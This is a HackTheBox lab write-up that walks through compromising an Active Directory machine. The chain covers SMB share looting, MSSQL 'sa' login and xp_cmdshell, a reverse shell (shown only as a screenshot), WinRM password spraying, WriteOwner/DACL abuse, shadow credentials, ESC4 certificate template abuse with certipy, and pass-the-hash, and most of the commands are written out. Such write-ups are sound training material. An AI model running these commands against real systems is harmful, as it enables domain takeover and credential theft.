# Introduction

This is the second machine of the revised and newly improved `Active Directory Exploitation` track in HackTheBox.

![Desktop View](/ad-series-1/image1.png)

This machine was labeled "Easy" level, but to be honest it did not feel easy. I would say medium. It was fun and pain in the ass at the same time. I have encountered things in which I needed to do some further research on just to finish the machine. Anyways, I'll show you what is it about. The machine provided a credential for 1 user:

 User: rose
 password: KxEPkKe6R8su

# Recon and Enum Phase

The usual. I ran an nmap scan:

```
nmap -sCV -p- --min-rate 300 -vv 10.10.11.51 
```

### Nmap results:

```

A bunch of open ports but hey! We can check if we can enumerate some shares unauthenticated.
![Desktop View](/ad-series-2/ss1.png)

Well, it seems that I was not that lucky. So I used the credentials that were given by the challenge.

```
nxc smb <IP> -u rose -p <password> --shares
```

![Desktop View](/ad-series-2/ss2.png)

That's cool. So I was able to retrieve information with that. So there was a share called **Accounting Department**. So I checked if I could access it. 

```
smbclient \\\\<IP>\\'Accounting Department' -U rose --password=<password>
```

![Desktop View](/ad-series-2/ss3.png)

So, yeah I could access it and there were two files as you can see on the screenshot above.
![Desktop View](/ad-series-2/ss4.png)

The `sharedStrings.xml` looked juicy to me. So I opened it and I found it's a bunch of users and their password. 
![Desktop View](/ad-series-2/ss5.png)

Though if you look closely, there is a user called `sa` and its password. 
> **sa** or (System Administrator) is the default built-in administrator account with the highest privileges.
{: .prompt-info }

With that information, I was thinking maybe I could login to their SQL Server. I don't know. Just a thought. So I fired up another terminal and hit it with 
this tender juicy hatdog ðŸŒ­ command: 

```
python3 mssqlclient.py 'sa:<password>'@<IP>
```

As you can see, I was able to logged in! This is great. There is an improvement. 
![Desktop View](/ad-series-2/ss6.png)

From here on, I was checking if I could exfil some data, looked for some other juicy databases, but it wasn't tender juicy as I was expecting. Luckily, out of the blue, I remember
something I have done before which is using `xp_cmdshell` to execute system commands on the SQL Server.  

> **xp_cmdshell** is an extended stored procedure in Microsoft SQL Server that allows commands to be executed directy from it. This is disabled by default due to security considerations as it can be abused for privilege escalation and remote code execution. If a user with sysadmin priveleges enables `xp_cmdshell`, SQL Server can execute system commands with SQL Server's service account privileges, which is a major security risk.
{: .prompt-danger}


With that information, I enabled `xp_cmdshell` so I could execute commands.

### Enable `advanced options` and `xp_cmdshell`:

```
EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;
```

![Desktop View](/ad-series-2/ss7.png)

Now, that's enabled. At this point, I was thinking of establishing a reverse shell. So with the help of <a href="https://revshells.com" target="_blank">Reverse Shell Generator</a>, I crafted my payload.
![Desktop View](/ad-series-2/ss9.png)

Since it's a windows system, of course it would be logical to use powershell payload, right? I don't know, but yeah. Based on my experience, it is much better to encode the payload to `Base64` so I chose the payload encoded in `Base64`. I also setup the listener on the side as well.

![Desktop View](/ad-series-2/ss10.png)

After executing the command above, I was able to spawn a shell on my machine.
![Desktop View](/ad-series-2/ss11.png)

So, it seems that I am user `sequel\sql_svc`. So first I tried looking around then when I went to `C:\` directory, there was this folder named `SQL2019`. That's something interesting, right? So I checked its contents.
![Desktop View](/ad-series-2/ss12.png)

![Desktop View](/ad-series-2/ss13.png)

I'm not sure what that was so I checked its contents as well.
![Desktop View](/ad-series-2/ss14.png)

This is where it got interesting. As you can see in the screenshot above, there is a file called `sql-Configuration.INI`

> `Configuration.INI` is a configuration file used to perform unattended installations of Microsoft SQL Server. So instead of manually selecting options in the SQL Server setup wizard, you can provide details in this file to automate the installation process.
{: .prompt-info}

What's interesting in this file is that, usually, one of the parameters is the password. So if I am not mistaken, this configuration file should have password in it. So I checked the contents of this configuration file.
![Desktop View](/ad-series-2/ss15.png)

So, there it is. Password. What a tender juicy hatdog. ðŸŒ­

I looked around to check for more things or information that would be useful eventually. I looked into the `C:\users` directory to check who are the users and I found another user named `ryan`.
![Desktop View](/ad-series-2/ss16.png)

# Gaining Initial Foothold

From here on, I was thinking maybe with all the passwords I got now could be used to this user `ryan`. Remember the `accounts.xlsx` that contained an xml file where there was a list of passwords and users. Though there was no ryan user there, I still copied all the password and put it in a `pass.txt` file. I also included the password from the configuration file. Who knows, we need all the resources we have to check for things, right? In that way, maybe we could hit some tender juicy hatdog ðŸŒ­ along the way. 

Using `netexec` I tried to check if any of these passwords would fit for ryan so we could establish remote access using `evil-winrm`. 

```
nxc winrm <IP> -u ryan -p pass.txt
```

![Desktop View](/ad-series-2/ss17.png)

And would you look at that! We hit a hatdog ðŸŒ­. So I used that password to for the evil-winrm.

```
evil-winrm -i <IP> -u ryan -p <password>
```

![Desktop View](/ad-series-2/ss18.png)

So now I am logged in as `ryan`. I also got the user flag. At this point, it was time to look around and find a way to escalate privileges. So I transferred the `SharpHound.exe` from my machine to the victim machine using smbserver. 

```
python3 smbserver.py <share name> -username <username> -password <password> <directory> -smb2support
```

![Desktop View](/ad-series-2/ss20.png)

![Desktop View](/ad-series-2/ss21.png)

After executing the SharpHound and extracting the zip file from its result, I fired up bloodhound to check for privesc paths. After looking around, this is what I got. So, I was not able to take a screenshot where their original names were showing so I had to improvise. Sorry about that. Anyways As you can see, `ryan` seemed to have the ability to take owenership of `ca_svc`.
![Desktop View](/ad-series-2/ss22.png)

> **WriteOwner** permission allows a user to change the ownership of an object (e.g., a user account, group, or computer)
{:.prompt-warning}

> In this case, `ryan` has `WriteOwner` permissions over `ca_svc`. This means `ryan` can change the owner of the `ca_svc` account to themselves. This will allow `ryan` to modify its permissions and give themselves full control over it, effectively granting themselves the same privileges as `ca_svc`.
{:.prompt-info}

# Privilege Escalation
At this point, that information could be used for a potential privilege escalation attack. So it's time to abuse the `WriteOwner` permission. I used `owneredit.py` from `Impacket` for this. 

```
owneredit.py -action write -new-owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
```

![Desktop View](/ad-series-2/ss24.png)

Now the owner has been successfully modified, I can now change permissions. For the next step, I used `dacledit.py`. 

This command modifies the Discretionary Access Control List (DACL) of `ca_svc` in Active Directory on the sequel.htb. This grants `FullControl` to `ryan`.

```
python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:<password>
```

| Command Option            | Explanation                                                   |
| :-------------------------| :-------------------------------------------------------------|
| -action 'write'           | Modification of DACL.                                         |
| -rights 'FullControl'     | Grants **Full Control** permissions. Highest level of access. |
| -principal 'ryan'         | The user whol will receive **Full Control**.                  |
| -target 'ca_svc'          | The AD object whose permissions will be modified.             |
| -sequel.htb/ryan:password | Credentials used to authenticate.                             |

![Desktop View](/ad-series-2/ss25.png)

After executing the command, DACL was modified successfully. At this point, I used `certipy` tool to interact with the `Active Directory Certificate Services` (AD CS). This tool can be used to enumerate, abuse, and misconfigure AD CS for privilege escalation or persistence.

```
sudo certipy-ad shadow auto -u 'ryan@sequel.htb' -p '<password>' -account 'ca_svc' -dc-ip <IP>
```

| Command Option            | Explanation                                                   |
| :-------------------------| :-------------------------------------------------------------|
| shadow auto               | Performs the **Shadow Credentials Attack**. This allows an attacker to gain persistence to <br> another AD user. |
| -u 'ryan@sequel.htb'      | The user account being used to authenticate. |
| -p '<password>'           | The password to login to AD. |
| -account 'ca_svc'         | The target account whose access is being hijacked. |
| -dc-ip                    | Specifies the Domain Controller (DC) IP address. |

I got the NT hash for the user `ca_svc`.
![Desktop View](/ad-series-2/ss26.png)


From here on, I needed to search for vulnerable certificate templates. I'm referring to misconfigured templates that could allow attackers to escalate privileges via `ESC1`, `ESC2`, etc.

So first, I set the environment variable `KRB5CCNAME` to point a Kerberos credential cache file `ca_svc.ccache` in the current working directory `$PWD`. The rest of the command is explained below.

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip <IP> -vulnerable -stdout
```

| Command Option            | Explanation                                                   |
| :-------------------------| :-------------------------------------------------------------|
| certipy-ad find           | The main command to search for certificate templates in the AD Certificate Services <br>(AD CS) environment. |
| -scheme ldap      | This specifies the authentication scheme to `ldap`.  |
| -k           | This enables Kerberos authentication (using the ticket from KRB5CCNAME). |
| -debug         | Enables debug output for troubleshooting. |
| -target dc01.sequel.htb | This sets the target domain controller. |
| -dc-ip <IP> | The IP address of the domain controller |
| -vulnerable | This will list the only certificate templates that are vulnerable to exploitation. |
| -stdout | This forces the output to be printed to the console |

![Desktop View](/ad-series-2/ss27.png)

![Desktop View](/ad-series-2/ss28.png)

![Desktop View](/ad-series-2/ss28-1.png)

As you can see in the result of the command bove, I was able to determine what to do next. Indicated in the `vulnerabilities` section was the ESC4.

> **ESC4** is a vulnerability that lets the attaker modify the Certificate Template to make it vulnerable. The conditions for this is that a low-privileged user has write permissions (e.g., `WriteProperty`, `WriteDacl`) on a certificate template.
{:.prompt-warning}

> We could use this for privilege escalation which could potentially lead to full domain compromise.
{:.prompt-danger}

With the information above, it was time to crack thy bones. ðŸ¦´

```
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip <IP>
```

![Desktop View](/ad-series-2/ss29.png)

I used this command to exploit AD CS. This will request a certificate for the `administrator@sequel.htb` account using the `DunderMifflinAuthentication` template. Since `ca_svc` has control over this template, it can generate a valid authentication certificate for `administrator`.

```
sudo certify-ad req -username 'ca_svc@sequel.htb' -hashes <hash> -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip <IP>
```

| Command Option            | Explanation                                                   |
| :-------------------------| :-------------------------------------------------------------|
| -username 'ca_svc@sequel.htb' | Authenticates as the `ca_svc` user. |
| -hashes <hash>      | Uses the NTLM hash of `ca_svc` instead of a password |
| -ca sequel-DC01-CA | Specifies the **Certificate Authority (CA)** server |
| -target DC01.sequel.htb | Targets the **Domain Controller (DC01)** for the certificate request. |
| -template DunderMifflinAuthentication | Specifies the certificate template to use for the request |
| -upn administrator@sequel.htb | Requests a certificate as `administrator@sequel.htb`, allowing <br> authentication as the Domain Admin. |
| -dc-ip <IP> | By this time, YOU GUYS / GAL ALREADY KNOW WHAT THIS HATDOG IS <BR> FOR RIGHT? |

![Desktop View](/ad-series-2/ss30.png)

Since I already have the `administrator.pfx` certificate that I could use to authenticate instead of using a password or hash.

```
certipy-ad auth -pfx administrator.pfx -domain sequel.htb
```

| Command Option            | Explanation  |
| :-------------------------| :-------------------------------------|
| certipy-ad auth | Uses Certipy to authenticate to Active Directory. |
| -pfx administrator.pfx | This specifies the PFX (Personal Information Exchange) certificate for authentication. |
| -domain sequel.htb | Ya'll know what this does. |


And now I got the administrator's hash. I could now log in as administrator using PtH attack.
![Desktop View](/ad-series-2/ss31.png)

```
evil-winrm -i <IP> -u "administrator" -H <Hash>
```

I am now logged in as administrator! From here on, just locate where the root flag is. I already got mine.

# Conclusion

This is how I understand on how to attack this machine. If you have any other ways or methods in compromising this machine, or even deeper explanation on how things work, I am open for feedback and discussion. So please feel free to reachout at `reacher@dracozona.com`.
